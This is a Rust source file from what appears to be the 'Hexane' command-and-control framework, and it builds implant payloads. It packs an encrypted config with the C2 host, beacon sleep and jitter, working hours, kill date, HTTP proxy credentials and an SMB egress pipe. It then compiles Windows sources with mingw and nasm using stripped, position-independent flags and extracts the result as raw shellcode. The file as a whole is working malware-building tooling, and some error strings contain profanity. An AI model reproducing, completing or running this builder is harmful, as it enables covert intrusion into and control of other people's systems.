use std::fs;
use std::path::{Path, PathBuf};
use std::str::FromStr;
use rand::Rng;

use crate::stream::Stream;
use crate::cipher::{crypt_create_key, crypt_xtea};
use crate::binary::{copy_section_data, embed_section_data, run_command};
use crate::utils::{canonical_path_all, generate_definitions, generate_hashes, generate_includes, generate_object_path, normalize_path};

use crate::types::Hexane;
use crate::interface::wrap_message;

use crate::error::{Error, Result};
use crate::error::Error::Custom;
use crate::rstatic::USERAGENT;

use crate::types::NetworkType::Http as HttpType;
use crate::types::NetworkOptions::Http as HttpOpt;
use crate::types::NetworkType::Smb as SmbType;
use crate::types::NetworkOptions::Smb as SmbOpt;

pub static DEBUG_FLAGS: &'static str = "-std=c++23 -Os -nostdlib -fno-exceptions -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC -fno-builtin '-Wl,--no-seh,--enable-stdcall-fixup' ";
pub static RELEASE_FLAGS: &'static str = "-std=c++23 -Os -nostdlib -fno-exceptions -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC -fno-builtin '-Wl,--no-seh,--enable-stdcall-fixup' ";

impl Hexane {
    pub(crate) fn setup_build(&mut self) -> Result<()> {
        let mut rng = rand::thread_rng();

        self.peer_id = rng.gen::<u32>();
        self.compiler_cfg.build_directory = format!("./payload/{}", &self.builder_cfg.output_name);

        let compiler_flags = if self.main_cfg.debug {
            DEBUG_FLAGS.parse().unwrap()
        }
        else {
            RELEASE_FLAGS.parse().unwrap()
        };

        self.compiler_cfg.flags = compiler_flags;

        wrap_message("INF", "creating build directory");
        if let Err(e) = fs::create_dir_all(&self.compiler_cfg.build_directory) {
            wrap_message("ERR", format!("create_dir_all: {e}").as_str());
            return Err(Error::from(e))
        }

        wrap_message("INF", "generating hashes");
        if let Err(e) = generate_hashes("./configs/strings.txt", "./core/include/names.hpp") {
            return Err(e);
        }

        wrap_message("INF", "creating patch");
        if let Err(e) = self.create_config_patch() {
            return Err(e)
        }

        wrap_message("INF", "compiling sources");
        if let Err(e) = self.compile_sources() {
            return Err(e)
        }

        Ok(())
    }

    fn create_config_patch(&mut self) -> Result<()> {
        self.session_key = crypt_create_key(16);

        let mut patch = self.create_binary_patch()?;
        let encrypt = self.main_cfg.encrypt;

        if encrypt {
            let patch_cpy = patch.clone();
            patch = crypt_xtea(&patch_cpy, &self.session_key, true)?;
        }

        self.config = patch;
        wrap_message("INF", "patch created successfully");

        Ok(())
    }

    fn create_binary_patch(&mut self) -> Result<Vec<u8>> {
        let mut stream = Stream::new();

        if let Some(modules) = &self.builder_cfg.loaded_modules {
            for module in modules {
                stream.pack_string(module);
            }
        } else {
            wrap_message("DBG", "no external module names found. continue.");
        }

        let working_hours = self.main_cfg.working_hours
            .as_ref()
            .map_or(Ok(0), |hours| i32::from_str(hours))
            .unwrap();

        let kill_date = self.main_cfg.killdate
            .as_ref()
            .map_or(Ok(0), |date| i64::from_str(date))
            .unwrap();

        stream.pack_bytes(&self.session_key);
        stream.pack_uint32(self.peer_id);
        stream.pack_string(&self.main_cfg.hostname);
        stream.pack_uint32(self.main_cfg.sleeptime);
        stream.pack_uint32(self.main_cfg.jitter as u32);

        stream.pack_int32(working_hours);
        stream.pack_uint3264(kill_date);

        if let Some(network) = self.network_cfg.as_mut() {
            let rtype   = &network.r#type;
            let opts    = &network.options;

            match (rtype, &opts) {
                (HttpType, HttpOpt(ref http)) => {
                    let useragent = http.useragent.as_ref().unwrap_or(&USERAGENT);

                    stream.pack_wstring(useragent);
                    stream.pack_wstring(&http.address);
                    stream.pack_uint32(http.port as u32);
                    stream.pack_uint32(http.endpoints.len() as u32);

                    for endpoint in &http.endpoints {
                        stream.pack_wstring(endpoint);
                    }

                    if let Some(ref domain) = http.domain {
                        stream.pack_string(domain);
                    } else {
                        stream.pack_uint32(0);
                    }

                    if let Some(ref proxy) = http.proxy {
                        let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);

                        stream.pack_uint32(1);
                        stream.pack_wstring(&proxy_url);
                        stream.pack_wstring(proxy.username.as_ref().unwrap());
                        stream.pack_wstring(proxy.password.as_ref().unwrap());
                    } else {
                        stream.pack_uint32(0);
                    }
                }

                (SmbType, SmbOpt(ref smb) ) => {
                    stream.pack_wstring(smb.egress_pipe
                        .as_ref()
                        .unwrap()
                        .as_str());
                }

                _ => {
                    wrap_message("ERR", "create_binary_patch: unknown network type");
                    return Err(Custom("fuck off".to_string()))
                }
            }
        }

        Ok(stream.buffer)
    }

    pub fn compile_sources(&mut self) -> Result<()> {
        let root_dir    = &self.builder_cfg.root_directory;
        let build_dir   = &self.compiler_cfg.build_directory;
        let output      = &self.builder_cfg.output_name;

        let mut components  = Vec::new();
        let src_path        = Path::new(root_dir).join("src");

        let entries = canonical_path_all(src_path)
            .map_err(|e| {
                wrap_message("ERR", format!("canonical_path_all: {e}").as_str());
                return Custom(e.to_string())
            })?;

        for path in entries {
            wrap_message("INF", format!("gathering: {:?}", path.to_str()).as_str());
            let source = normalize_path(path
                .to_str()
                .unwrap()
                .into()
            );

            let object_file = generate_object_path(&source, Path::new(build_dir))
                .map_err(|e| {
                    wrap_message("ERR", format!("compile_sources: {e}").as_str());
                    return Err(e)
                });

            let object = normalize_path(object_file
                .to_str()
                .unwrap()
                .into()
            );

            let mut command = String::new();
            match path.extension().and_then(|ext| ext.to_str()) {

                Some("cpp") => {
                    components.push(source);
                },
                Some("asm") => {
                    command.push_str("nasm");
                    command.push_str(format!(" -f win64 {} -o {}", source, object).as_str());

                    if let Err(e) = run_command(command.as_str(), format!("{output}-compiler_error").as_str()) {
                        wrap_message("error", format!("compile_sources:: {e}").as_str());
                        return Err(Custom("fuck off".to_string()));
                    }
                    components.push(object);
                },
                _ => {
                    continue;
                }
            }
        }

        wrap_message("INF", "linking final objects");

        self.run_mingw(components)?;
        self.extract_shellcode()?;

        Ok(())
    }

    fn run_mingw(&self, components: Vec<String>) -> Result<()> {
        let main_cfg    = &self.main_cfg;
        let network_cfg = &self.network_cfg.as_ref().unwrap();
        let output      = &self.builder_cfg.output_name;

        let definitions     = generate_definitions(main_cfg, network_cfg);
        let mut includes    = String::new();

        if let Some(dirs) = &self.builder_cfg.include_directories {
            includes = generate_includes(dirs);
        }

        let output = Path::new(&self.compiler_cfg.build_directory)
            .join(&output)
            .to_string_lossy();

        let mut linker_script   = PathBuf::new();
        let mut linker          = String::new();

        if let Some(script) = &self.builder_cfg.linker_script {
            linker_script = Path::new(&self.builder_cfg.root_directory)
                .join(script);

            let path = linker_script
                .to_string_lossy()
                .to_string();

            linker = normalize_path(path);
            linker = format!(" -T\"{}\" ", linker);
        }

        let flags   = self.compiler_cfg.flags.clone();
        let sources = components.join(" ");

        includes.push_str(" -I\".\" ");

        let mut params = Vec::new();
        params.push(sources);
        params.push(includes);
        params.push(definitions);
        params.push(linker);
        params.push(flags);

        let command = format!("x86_64-w64-mingw32-g++ {} -o {output}.exe", params.join(" "));

        if let Err(e) = run_command(command.as_str(), format!("{output}-linker_error").as_str()) {
            wrap_message("ERR", format!("linker_error {e}").as_str());
            return Err(e);
        }

        Ok(())
    }

    fn extract_shellcode(&self) -> Result<()> {
        let config  = &self.config;
        let output  = &self.builder_cfg.output_name;
        let size    = self.main_cfg.config_size as usize;

        if let Err(e) = embed_section_data(&format!("{output}.exe"), &config, size) {
            wrap_message("ERR", format!("compile_sources: {e}").as_str());
            return Err(e)
        }

        let mut shellcode: String = self.compiler_cfg.build_directory.to_owned();
        shellcode.push_str("/shellcode.bin");

        if let Err(e) = copy_section_data(&format!("{output}.exe"), shellcode.as_str(), ".text") {
            wrap_message("error", format!("extract_shellcode:: {e}").as_str());
            return Err(e)
        }

        // TODO: create option for dll loader
        Ok(())
    }
}
